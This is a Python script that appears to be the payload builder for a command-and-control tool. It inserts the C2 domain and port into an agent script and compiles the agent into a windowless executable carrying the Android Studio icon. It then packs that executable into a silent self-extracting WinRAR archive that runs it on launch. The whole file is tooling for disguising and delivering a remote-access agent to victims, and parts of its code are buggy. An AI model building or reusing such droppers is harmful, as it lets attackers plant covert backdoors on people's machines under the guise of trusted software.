import json
import os
import shutil
import PyInstaller.__main__
import subprocess
# from icoextract import IconExtractor, IconExtractorError
# from PIL import Image

# retrieve server config info
with open("config.json", "r") as f:
    config = json.load(f)
    
domain = config["c2Domain"]
port = config["c2Port"]

# customise agent
def input():
    name = input("Name your payload: ")
    ico_path = ""
    while not ico_path.endswith(".ico"):
        ico_path = input("Enter ICO file path: ")
    return name, ico_path


def generate(name):
    
    base = "./payloads/"
    ext = ".py"
    
    # check for existing agent file name before dup
    counter = 1
    while os.path.exists(name):
        counter += 1
        agent = f"{base}_{name}{counter}{ext}"
    shutil.copy("hexplosive-agent.py", agent)

    # mod with server config
    with open(agent, "r", encoding="utf8") as f:
        lines = f.readlines()
        lines[102] = lines[102].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
        lines[105] = lines[105].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
        
    with open(agent, "w", encoding="utf8") as f:
        f.writelines(lines)
    return agent
    
    
def compile():
    
    # testcase
    agentpy = "./payloads/agent.py"
    exe = "agent"
    ico = "C:/Program Files/Android/Android Studio/bin/studio.ico"
    
    # # path of exe in 'C:/Program Files'
    # payload_path = os.path.dirname(ico) + "\\" + exe + ".exe"
    
    # # mod file paths before compilation
    # with open(agentpy, "r", encoding="utf8") as f:
    #     lines = f.readlines()
    #     lines[76] = lines[76].replace('<exe.name.here>', exe).replace('<payload.path.here>', payload_path)
    #     lines[120] = lines[120].replace('<payload.path.here>', payload_path)
        
    # with open(agentpy, "w", encoding="utf8") as f:
    #     f.writelines(lines)
    
    
    # compilation
    try:
        PyInstaller.__main__.run([
            agentpy,
            '--noconsole',
            '--onefile',
            '--distpath=./payloads',
            '--icon='+ ico
        ])
        
        # remove unused folders & spec file
        shutil.rmtree("./build", ignore_errors=True)
        shutil.rmtree("./dist", ignore_errors=True)
        os.remove(exe+".spec")
        
    except Exception as e:
        print("Error occured during pyinstaller compilation.")
    
    
    
def createSFX(name,ico): 
    try:
        # Path to WinRAR
        path_win = "C:/Program Files/WinRAR/WinRAR.exe"
        
        # config for sfx
        config_content = f"""
        Setup={name}.exe
        TempMode
        Silent=1
        Overwrite=1
        Update=U
        """

        # write to config.txt
        with open("./config.txt", "w") as config_file:
            config_file.write(config_content)

        # Convert to SFX with icon and config
        subprocess.run([
            path_win,
            "a",
            "-sfx",  
            "-iicon" + ico,
            "-zconfig.txt",
            "-r",
            "-ep1",
            "payloads/"+name+"rar",
            'payloads/'+name+'.exe'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # extract archive
    except Exception as e:
        print("Error creating SFX")



# name, ico = input()   
# agentpy = generate(name)
# compile(agentpy,name,ico)
# createSFX(name,ico)
compile()


# exe = "android studio"
# ico_path = "C:\Program Files\Android\Android Studio\bin\studio.ico"

